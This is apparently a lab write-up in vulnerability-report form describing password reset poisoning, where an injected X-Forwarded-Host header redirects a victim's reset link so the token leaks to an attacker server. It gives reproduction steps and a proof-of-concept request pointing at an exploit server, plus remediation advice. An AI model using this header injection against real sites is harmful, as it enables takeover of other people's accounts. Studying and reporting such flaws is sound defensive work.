# Vulnerability Report: Account Takeover via Password Reset Poisoning

**Severity:** High  
**CVSS Score:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)  
**Date:** 2026-07-26  
**Target:** TARGET.web-security-academy.net  

## Executive Summary
A password reset poisoning vulnerability was identified in the forgot password functionality of the application.
The application uses the `X-Forwarded-Host` header to dynamically construct the password reset URL included in the email sent to the user.
An attacker can supply an arbitrary value in this header, redirecting the reset link to a server they control.
When the victim clicks the link, the reset token is leaked to the attacker — who can then use it to set a new password and take over the account.

## Vulnerability Details
| Field | Value |
|-------|-------|
| Type | Password Reset Poisoning |
| Endpoint | `POST /forgot-password` |
| Method | POST |
| Vulnerable Header | `X-Forwarded-Host` |
| User Interaction | Required (victim must click the reset link) |
| Impact | Full account takeover |

## Steps to Reproduce
1. Submit a forgot password request for your own account and capture the POST request to `/forgot-password` in Burp.
2. Observe the reset link in the email — note the base URL used to construct it.
3. Resend the request with an added `X-Forwarded-Host: attacker.com` header.
4. Check the email — confirm the reset link now points to `attacker.com`.
5. Resend the request with `username=carlos` and `X-Forwarded-Host: <exploit-server>`.
6. Wait for the victim to click the link — the token appears in the exploit server's access log.
7. Use the captured token at `/forgot-password?temp-forgot-password-token=<token>` to set a new password for carlos.
8. Log in with the new credentials — account takeover confirmed.

## Proof of Concept
```http
POST /forgot-password HTTP/2
Host: TARGET.web-security-academy.net
X-Forwarded-Host: exploit-server.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

**Token captured from access log:**
```
/forgot-password?temp-forgot-password-token=<stolen_token>
```

## Impact
Any account on the platform can be taken over with a single header injection and one victim click.
The attack is particularly dangerous because the reset email originates from the legitimate application — giving the victim no indication that anything is wrong. This can lead to:
- Full account takeover of any user on the platform
- Access to all data and functionality tied to the victim's account
- Unauthorized actions performed on behalf of the victim

## Remediation
- Never use client-supplied headers to construct URLs in sensitive flows — the reset URL base should be hardcoded in server-side configuration
- If forwarding headers must be trusted (e.g. behind a reverse proxy), restrict that trust to known proxy IPs only and reject the headers from all other sources
- Ensure reset tokens are single-use and short-lived to minimize the exploitation window if a token is leaked

## References
- OWASP: Forgot Password Cheat Sheet
- CWE-640: Weak Password Recovery Mechanism for Forgotten Password
- PortSwigger: Password reset poisoning